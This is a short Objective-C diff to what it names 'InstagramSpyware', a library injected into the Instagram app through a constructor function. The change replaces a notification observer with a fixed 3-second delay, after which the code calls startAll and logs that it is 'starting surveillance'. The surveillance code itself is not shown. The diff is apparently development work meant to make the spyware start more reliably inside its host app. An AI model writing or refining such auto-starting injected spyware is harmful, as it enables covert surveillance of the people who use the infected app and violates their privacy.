@@ -413,12 +413,14 @@
 #pragma mark - Constructor
 __attribute__((constructor))
 static void initInstagramSpyware() {
-    [[NSNotificationCenter defaultCenter] addObserverForName:UIApplicationDidBecomeActiveNotification
-                                                      object:nil
-                                                       queue:[NSOperationQueue mainQueue]
-                                                  usingBlock:^(NSNotification * _Nonnull note) {
-        dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(1.0 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
-            [[InstagramSpyware sharedInstance] startAll];
-        });
-    }];
+    // Don't do anything heavy here. Just schedule the real work to run later.
+    // We use a 3-second delay to give the host app plenty of time to
+    // initialize its UI, scenes, and notification delegates.
+    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(3.0 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
+        NSLog(@"[InstagramSpyware] Constructor delay finished, starting surveillance.");
+        
+        // Now it's safe to start. The notification observer is redundant
+        // if we're just starting after a delay, so we call startAll directly.
+        [[InstagramSpyware sharedInstance] startAll];
+    });
 }
